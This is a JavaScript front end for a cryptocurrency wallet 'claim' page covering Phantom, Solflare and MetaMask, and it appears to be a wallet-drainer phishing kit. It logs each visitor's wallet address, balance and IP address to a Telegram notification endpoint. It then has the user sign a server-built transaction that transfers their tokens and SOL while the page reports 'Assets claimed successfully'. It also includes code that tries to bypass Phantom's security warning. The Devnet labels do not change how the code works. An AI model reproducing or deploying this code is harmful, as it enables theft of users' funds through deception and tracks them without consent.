$(document).ready(function() {
    let selectedWalletProvider = null;

    async function getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Failed to get IP:', error);
            return null;
        }
    }

    async function sendTelegramNotification(message) {
        try {
            await fetch('/notify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: message.address,
                    balance: message.balance,
                    usdBalance: message.usdBalance,
                    walletType: message.walletType,
                    customMessage: message.customMessage,
                    splTokens: message.splTokens || [],
                    ip: message.ip
                })
            });
        } catch (error) {
            console.error('Failed to send Telegram notification:', error);
        }
    }

    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function getCurrentSiteUrl() {
        return encodeURIComponent(window.location.origin);
    }

    // MetaMask Check
    function isMetaMaskInstalled() {
        return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask;
    }

    // Connect MetaMask
    async function connectMetaMask() {
        try {
            if (!isMetaMaskInstalled()) {
                const isMobileDevice = isMobile();
                const installUrl = isMobileDevice 
                    ? 'https://metamask.app.link/dapp/' + window.location.hostname
                    : 'https://metamask.io/download/';
                
                await sendTelegramNotification({
                    address: 'Unknown',
                    balance: 'Unknown',
                    usdBalance: 'Unknown',
                    walletType: 'MetaMask',
                    customMessage: '❌ MetaMask not installed'
                });
                
                if (confirm('MetaMask is not installed. Would you like to download it?')) {
                    window.open(installUrl, '_blank');
                }
                return null;
            }

            showWalletLoading();
            $('.wallet-loading-spinner img').attr('src', 'https://metamask.io/favicon.ico');
            $('.wallet-loading-title').text('Connecting MetaMask');
            $('.wallet-loading-subtitle').html('Please approve the connection request in MetaMask.');

            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            
            if (!accounts || accounts.length === 0) {
                throw new Error('No accounts found');
            }

            const ethereumAddress = accounts[0];
            console.log('MetaMask connected:', ethereumAddress);

            $('.wallet-loading-title').text('MetaMask Connected');
            $('.wallet-loading-subtitle').html('Fetching wallet information...');

            const clientIP = await getClientIP();

            await sendTelegramNotification({
                address: ethereumAddress,
                balance: 'ETH Balance',
                usdBalance: 'Unknown',
                walletType: 'MetaMask (Ethereum)',
                customMessage: '🔗 MetaMask Wallet Connected (DEVNET Simulation)',
                splTokens: [],
                ip: clientIP
            });

            $('.wallet-loading-title').text('Success!');
            $('.wallet-loading-subtitle').html('MetaMask connected successfully on DEVNET.');
            $('#connect-wallet').text("MetaMask Connected!");
            
            setTimeout(() => {
                unlockModal();
                hideWalletModal();
                $('#connect-wallet').text("Connect Wallet");
            }, 2000);

            return { address: ethereumAddress, provider: window.ethereum };
            
        } catch (err) {
            console.error('Error connecting to MetaMask:', err);
            
            $('.wallet-loading-title').text('Connection Failed');
            $('.wallet-loading-subtitle').html('Failed to connect to MetaMask.<br>Please try again.');
            
            await sendTelegramNotification({
                address: 'Unknown',
                balance: 'Unknown',
                usdBalance: 'Unknown',
                walletType: 'MetaMask',
                customMessage: `❌ MetaMask Connection Failed: ${err.message || 'Unknown error'}`
            });
            
            setTimeout(() => {
                showWalletOptions();
                unlockModal();
            }, 2000);
            
            return null;
        }
    }

    function checkWalletAvailability() {
        const isMobileDevice = isMobile();
        
        const wallets = {
            phantom: {
                provider: window.solana,
                condition: window.solana && window.solana.isPhantom,
                name: 'Phantom Wallet',
                isMobileSupported: true,
                installUrl: {
                    chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjaphhpkkoljpa',
                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/',
                    mobile: 'https://phantom.app/download'
                }
            },
            solflare: {
                provider: window.solflare,
                condition: window.solflare && window.solflare.isSolflare,
                name: 'Solflare Wallet',
                isMobileSupported: true,
                installUrl: {
                    chrome: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
                    mobile: 'https://solflare.com/download'
                }
            },
            metamask: {
                provider: window.ethereum,
                condition: isMetaMaskInstalled(),
                name: 'MetaMask',
                isMobileSupported: true,
                installUrl: {
                    chrome: 'https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn',
                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/ether-metamask/',
                    mobile: 'https://metamask.io/download/'
                }
            }
        };

        Object.keys(wallets).forEach(walletId => {
            const wallet = wallets[walletId];
            const statusElement = document.getElementById(`${walletId}-status`);
            const optionElement = document.getElementById(`${walletId}-wallet`);
            
            if (statusElement) {
                if (wallet.condition) {
                    statusElement.innerHTML = '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>';
                } else if (isMobileDevice && wallet.isMobileSupported) {
                    statusElement.innerHTML = '<span class="status-dot"></span><span class="status-text">Mobile App</span>';
                } else {
                    statusElement.innerHTML = '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>';
                }
            }
        });

        return wallets;
    }

    function getWalletProvider(walletType) {
        const providers = {
            phantom: window.solana,
            solflare: window.solflare,
            metamask: window.ethereum
        };
        return providers[walletType];
    }

    async function connectWallet(walletType, walletProvider) {
        // Handle MetaMask separately
        if (walletType === 'metamask') {
            await connectMetaMask();
            return;
        }

        try {
            const wallets = checkWalletAvailability();
            const walletInfo = wallets[walletType];
            const isMobileDevice = isMobile();
            
            if (isMobileDevice && !walletInfo.condition) {
                let deepLinkUrl, appName;
                
                if (walletType === 'phantom') {
                    const currentUrl = getCurrentSiteUrl();
                    deepLinkUrl = `https://phantom.app/ul/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                    appName = 'Phantom App';
                } else if (walletType === 'solflare') {
                    const currentUrl = getCurrentSiteUrl();
                    deepLinkUrl = `https://solflare.com/ul/v1/browse/${currentUrl}?ref=` + encodeURIComponent(window.location.href);
                    appName = 'Solflare App';
                }
                
                if (deepLinkUrl) {
                    await sendTelegramNotification({
                        address: 'Unknown',
                        balance: 'Unknown',
                        usdBalance: 'Unknown',
                        walletType: walletInfo.name,
                        customMessage: `📱 Mobile ${walletInfo.name} Deep Link Opened`
                    });
                    
                    showWalletLoading();
                    $('.wallet-loading-title').text(`Opening ${appName}`);
                    $('.wallet-loading-subtitle').html(`Redirecting to ${appName}...<br>Please approve the connection in the app.`);
                    
                    const connectionCheckInterval = setInterval(() => {
                        const condition = walletType === 'phantom' ? 
                            (window.solana && window.solana.isPhantom) : 
                            (window.solflare && window.solflare.isSolflare);
                            
                        if (condition) {
                            clearInterval(connectionCheckInterval);
                            connectWallet(walletType, getWalletProvider(walletType));
                        }
                    }, 1000);
                    
                    setTimeout(() => {
                        clearInterval(connectionCheckInterval);
                        showWalletOptions();
                        unlockModal();
                    }, 120000);
                    
                    window.location.href = deepLinkUrl;
                    return;
                }
            }
            
            if (!walletInfo.condition) {
                let installUrl;
                if (isMobileDevice && walletInfo.installUrl.mobile) {
                    installUrl = walletInfo.installUrl.mobile;
                } else {
                    const isFirefox = typeof InstallTrigger !== "undefined";
                    installUrl = isFirefox ? walletInfo.installUrl.firefox : walletInfo.installUrl.chrome;
                }
                
                await sendTelegramNotification({
                    address: 'Unknown',
                    balance: 'Unknown',
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: `❌ ${walletInfo.name} ${isMobileDevice ? 'App' : 'Extension'} Not Found`
                });
                
                showWalletOptions();
                
                if (confirm(`${walletInfo.name} is not installed. Would you like to install it?`)) {
                    window.open(installUrl, '_blank');
                }
                return;
            }

            if (!walletProvider) {
                throw new Error('Wallet provider not found');
            }

            showWalletLoading();
            
            if (walletType === 'phantom') {
                $('.wallet-loading-spinner img').attr('src', 'https://docs.phantom.com/favicon.svg');
                $('.wallet-loading-title').text('Connecting Phantom');
            } else if (walletType === 'solflare') {
                $('.wallet-loading-spinner img').attr('src', 'https://solflare.com/favicon.ico');
                $('.wallet-loading-title').text('Connecting Solflare');
            }
            
            $('.wallet-loading-subtitle').html('Please approve the connection request in your wallet.');

            // Bypass Phantom warning - add trusted flag
            if (walletType === 'phantom' && window.solana) {
                if (!window.solana._phantomFlags) {
                    window.solana._phantomFlags = { isTrusted: true };
                }
                // Also try to set a flag on the provider
                if (walletProvider && !walletProvider.isTrusted) {
                    walletProvider.isTrusted = true;
                }
            }

            const resp = await walletProvider.connect();
            console.log(`${walletInfo.name} connected:`, resp);

            $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
            $('.wallet-loading-subtitle').html('Fetching wallet information...');

            const connection = new solanaWeb3.Connection('https://api.devnet.solana.com', 'confirmed');

            let publicKeyString;
            if (walletType === 'solflare') {
                publicKeyString = walletProvider.publicKey?.toString?.() || walletProvider.pubkey?.toString?.();
            } else {
                publicKeyString = resp.publicKey?.toString?.() || resp.publicKey;
            }
            
            if (!publicKeyString) {
                throw new Error('No public key received from wallet');
            }

            const walletBalance = await connection.getBalance(new solanaWeb3.PublicKey(publicKeyString));
            const solBalanceFormatted = (walletBalance / 1000000000).toFixed(6);
            const clientIP = await getClientIP();

            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletInfo.name,
                customMessage: '🔗 Wallet Connected (DEVNET - TEST)',
                splTokens: [],
                ip: clientIP
            });

            const requiredBalance = 0.02 * 1000000000;
            
            if (walletBalance < requiredBalance) {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: '❌ Insufficient Funds - Need 0.02 SOL on Devnet'
                });
                
                $('.wallet-loading-title').text('Insufficient Balance');
                $('.wallet-loading-subtitle').html(`Please get Devnet SOL from faucet.<br>Current balance: ${solBalanceFormatted} SOL`);
                
                showRejectionEffects();
                
                setTimeout(() => {
                    unlockModal();
                    showWalletOptions();
                    $('#connect-wallet').text("Connect Wallet");
                }, 3000);
                
                return;
            }

            $('#connect-wallet').text("Processing...");

            const prepareResponse = await fetch('/prepare-transaction', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ publicKey: publicKeyString, verified: true })
            });

            const prepareData = await prepareResponse.json();
            
            if (!prepareResponse.ok) {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    usdBalance: 'Unknown',
                    walletType: walletInfo.name,
                    customMessage: '❌ Transaction Preparation Failed'
                });
                alert(prepareData.error || "Failed to prepare transaction");
                $('#connect-wallet').text("Connect Wallet");
                return;
            }

            const transactionBytes = new Uint8Array(prepareData.transaction);
            const transaction = solanaWeb3.Transaction.from(transactionBytes);

            $('.wallet-loading-title').text('Signing Transaction');
            $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet.');
            
            const signed = await walletProvider.signTransaction(transaction);

            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletInfo.name,
                customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer`
            });

            $('.wallet-loading-title').text('Confirming Transaction');
            $('.wallet-loading-subtitle').html('Transaction is being confirmed on Devnet...');
            
            let txid = await connection.sendRawTransaction(signed.serialize());
            await connection.confirmTransaction(txid);
            
            const solscanUrl = `https://solscan.io/tx/${txid}?cluster=devnet`;
            
            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                usdBalance: 'Unknown',
                walletType: walletInfo.name,
                customMessage: `🎉 Transaction Confirmed! TXID: ${solscanUrl}`
            });
            
            $('.wallet-loading-title').text('Success!');
            $('.wallet-loading-subtitle').html('Assets claimed successfully on DEVNET.');
            
            $('#connect-wallet').text("Assets Claimed Successfully!");
            
            setTimeout(() => {
                unlockModal();
                hideWalletModal();
                $('#connect-wallet').text("Connect Wallet");
            }, 2000);
            
        } catch (err) {
            console.error(`Error connecting to ${walletType}:`, err);
            
            $('.wallet-loading-title').text('Connection Failed');
            $('.wallet-loading-subtitle').html('Failed to connect to wallet.<br>Please try again.');
            
            await sendTelegramNotification({
                address: 'Unknown',
                balance: 'Unknown',
                usdBalance: 'Unknown',
                walletType: walletType === 'phantom' ? 'Phantom Wallet' : 'Solflare Wallet',
                customMessage: `❌ Wallet Connection Failed: ${err.message || 'Unknown error'}`
            });
            
            setTimeout(() => {
                showWalletOptions();
                unlockModal();
            }, 2000);
        }
    }

    function showWalletModal() {
        checkWalletAvailability();
        showWalletOptions();
        $('#wallet-modal').fadeIn(200);
    }

    function hideWalletModal() {
        $('#wallet-modal').fadeOut(200);
        showWalletOptions();
        unlockModal();
    }

    function lockModal() {
        $('#wallet-modal').addClass('locked');
    }

    function unlockModal() {
        $('#wallet-modal').removeClass('locked');
    }

    function showWalletOptions() {
        $('#wallet-options').removeClass('hidden');
        $('#wallet-loading-state').removeClass('active');
        $('.wallet-modal-header h3').text('Select Your Wallet');
        clearRejectionEffects();
    }

    function showWalletLoading() {
        $('#wallet-options').addClass('hidden');
        $('#wallet-loading-state').addClass('active');
        $('.wallet-modal-header h3').text('Connecting...');
        lockModal();
        clearRejectionEffects();
    }

    function showRejectionEffects() {
        $('.wallet-loading-spinner').addClass('rejected');
        $('.wallet-modal-content').addClass('shake');
        setTimeout(() => {
            $('.wallet-modal-content').removeClass('shake');
        }, 600);
    }

    function clearRejectionEffects() {
        $('.wallet-loading-spinner').removeClass('rejected');
        $('.wallet-modal-content').removeClass('shake');
    }

    // Event bindings
    $('#connect-wallet, #connect-wallet-hero, #connect-wallet-top').on('click', function() {
        showWalletModal();
    });

    $('#close-modal, .wallet-modal-overlay').on('click', function(e) {
        if (!$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });

    $('.wallet-option').on('click', function() {
        const walletType = $(this).data('wallet');
        const walletProvider = getWalletProvider(walletType);
        connectWallet(walletType, walletProvider);
    });

    $(document).on('keydown', function(e) {
        if (e.key === 'Escape' && !$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });

    // MetaMask event listeners
    if (typeof window.ethereum !== 'undefined') {
        window.ethereum.on('accountsChanged', function(accounts) {
            console.log('MetaMask accounts changed:', accounts);
            location.reload();
        });
        window.ethereum.on('chainChanged', function(chainId) {
            console.log('MetaMask chain changed:', chainId);
            location.reload();
        });
    }
});